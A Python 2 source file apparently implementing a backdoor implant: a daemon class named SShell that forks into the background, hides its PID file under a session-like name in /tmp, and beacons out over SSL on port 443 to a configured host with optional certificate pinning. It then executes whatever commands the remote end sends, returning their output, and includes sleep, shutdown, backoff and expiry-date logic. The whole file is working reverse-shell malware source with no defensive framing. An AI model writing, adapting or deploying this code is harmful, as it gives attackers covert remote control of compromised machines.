#!/usr/bin/env python
import socket
import ssl
import hashlib
import subprocess
import time
import struct
import sys
import os
import atexit
import signal
from threading import Timer
import shlex


class Daemon(object):
    """
    A generic daemon class.
    
    Usage: subclass the Daemon class and override the run() method
    """
    def __init__(self, pid_file, stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
        self.stdin = stdin
        self.stdout = stdout
        self.stderr = stderr
        self.pidfile = pid_file
    
    def daemonize(self):
        """
        do the UNIX double-fork magic, see Stevens' "Advanced 
        Programming in the UNIX Environment" for details (ISBN 0201563177)
        http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16
        """
        try: 
            pid = os.fork() 
            if pid > 0:
                # exit first parent
                sys.exit(0) 
        except OSError, e: 
            sys.stderr.write("fork #1 failed: %d (%s)\n" % (e.errno, e.strerror))
            sys.exit(1)
    
        # decouple from parent environment
        os.chdir("/") 
        os.setsid() 
        os.umask(0) 
    
        # do second fork
        try: 
            pid = os.fork() 
            if pid > 0:
                # exit from second parent
                sys.exit(0) 
        except OSError, e: 
            sys.stderr.write("fork #2 failed: %d (%s)\n" % (e.errno, e.strerror))
            sys.exit(1) 
    
        # redirect standard file descriptors
        sys.stdout.flush()
        sys.stderr.flush()
        si = file(self.stdin, 'r')
        so = file(self.stdout, 'a+')
        se = file(self.stderr, 'a+', 0)
        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())
    
        # write pidfile
        atexit.register(self.delpid)
        pid = str(os.getpid())
        file(self.pidfile, 'w+').write("%s\n" % pid)
    
    def delpid(self):
        os.remove(self.pidfile)

    def start(self):
        """
        Start the daemon
        """
        # Check for a pidfile to see if the daemon already runs
        try:
            pf = file(self.pidfile, 'r')
            pid = int(pf.read().strip())
            pf.close()
        except IOError:
            pid = None
    
        if pid:
            message = "pidfile %s already exist. Daemon already running?\n"
            sys.stderr.write(message % self.pidfile)
            sys.exit(1)
        
        # Start the daemon
        self.daemonize()
        self.run()

    def stop(self):
        """
        Stop the daemon
        """
        # Get the pid from the pidfile
        try:
            pf = file(self.pidfile,'r')
            pid = int(pf.read().strip())
            pf.close()
        except IOError:
            pid = None
    
        if not pid:
            message = "pidfile %s does not exist. Daemon not running?\n"
            sys.stderr.write(message % self.pidfile)
            return # not an error in a restart

        # Try killing the daemon process    
        try:
            while 1:
                os.kill(pid, signal.SIGTERM)
                time.sleep(0.1)
        except OSError, err:
            err = str(err)
            if err.find("No such process") > 0:
                if os.path.exists(self.pidfile):
                    os.remove(self.pidfile)
            else:
                print str(err)
                sys.exit(1)

    def restart(self):
        """
        Restart the daemon
        """
        self.stop()
        self.start()

    def run(self):
        """
        You should override this method when you subclass Daemon. It will be called after the process has been
        daemonized by start() or restart().
        """

#-----------------------------------------------------------------------------------------


class SShell(Daemon):

    PORT = 443
    HOST = 'localhost'
    CERT_HASH = 'f146e9f45d116241e0dabf1cd25905fa28d16f53'
    PREAMBLE = '1010101010101010101010101010101010101010101010101010101010101011'
    EXPIRE = '2016-06-01'  # yyyy-mm-dd
    SLEEPMAX = 3600

    def __init__(self, pid_file, verify=False):
        super(SShell, self).__init__(pid_file)
        self.seconds = 0
        self.verify = verify

    @staticmethod
    def _exec_timeout(commands, timeout_sec=60):
        output = ' '
        kill_process = lambda p: os.killpg(pgid, signal.SIGTERM)  # kill process group
        process = subprocess.Popen(commands, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   shell=True, preexec_fn=os.setsid)
        pgid = os.getpgid(process.pid)
        timer = Timer(timeout_sec, kill_process, [pgid])

        try:
            timer.start()
            stdout, stderr = process.communicate()
            if timer.isAlive() is False:
                output = "Command timed out in {} seconds".format(timeout_sec)
            else:
                output = stdout + stderr
            if output == '':
                output = ' '
            return output
        except subprocess.CalledProcessError as e:
            return "ERROR: CalledProcessError - {}".format(e)
        except OSError as e:
            return "ERROR: OSError - {}".format(e.args)
        finally:
            timer.cancel()

    @staticmethod
    def _exec(commands):
        try:
            output = subprocess.check_output(commands, stderr=subprocess.STDOUT)
            if output == '':
                output = ' '
            return output
        except subprocess.CalledProcessError as e:
            return "ERROR: CalledProcessError - {}".format(e)
        except OSError as e:
            return "ERROR: OSError - {}".format(e.args)

    def launch_shell(self, stream):
        self.seconds = 0
        while True:
            data = stream.read()
            if not data:
                return True
            if data == '!shutdown':
                return False
            elif data.startswith('!sleep'):
                self.shutdown_connection(stream)
                duration = data.split()[1]
                time.sleep(int(duration) * 60)
                return True
            else:
                cmd_out = self._exec_timeout(data)
                msg = struct.pack('>I', len(cmd_out)) + cmd_out
                stream.write(msg)

    def verify_cert(self, ssl_sock):
        if self.verify is False:
            return True
        try:
            cert = ssl_sock.getpeercert(binary_form=True)
        except AttributeError:
            return False
        if SShell.CERT_HASH == hashlib.sha1(cert).hexdigest():
            return True
        else:
            return False

    def shutdown_connection(self, ssl_stream):
        if ssl_stream is None:
            pass
        else:
            try:
                ssl_stream.shutdown(socket.SHUT_RDWR)
                ssl_stream.close()
            except socket.error:
                pass

    def hibernate(self):
        if time.strftime('%Y-%m-%d') >= SShell.EXPIRE:
            exit()
        time.sleep(self.seconds)
        if self.seconds >= SShell.SLEEPMAX:
            pass
        else:
            self.seconds += 15

    def get_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if self.verify is True:
                ssl_stream = ssl.wrap_socket(sock, ca_certs='server.crt', cert_reqs=ssl.CERT_REQUIRED)
            else:
                ssl_stream = ssl.wrap_socket(sock, cert_reqs=ssl.CERT_NONE)
            ssl_stream.connect((SShell.HOST, SShell.PORT))
            return ssl_stream
        except socket.error:
            return None

    def run(self):
        stay_alive = True
        while stay_alive is True:
            self.hibernate()
            try:
                ssl_stream = self.get_connection()
                if ssl_stream is None:
                    pass
                elif self.verify_cert(ssl_stream) is True:
                    ssl_stream.write(SShell.PREAMBLE)
                    stay_alive = self.launch_shell(ssl_stream)
                    self.shutdown_connection(ssl_stream)
            except Exception:
                pass

#-------------------------------------------------------------------------------------------

if __name__ == "__main__":
    daemon = SShell('/tmp/sess_b7b300002e69c9b3451202ca93f67381.pid')
    if len(sys.argv) == 2:
        if 'start' == sys.argv[1]:
            daemon.start()
        elif 'stop' == sys.argv[1]:
            daemon.stop()
        elif 'restart' == sys.argv[1]:
            daemon.restart()
        else:
            print "Unknown command"
            sys.exit(2)
        sys.exit(0)
    else:
        print "usage: %s start|stop|restart" % sys.argv[0]
        sys.exit(2)
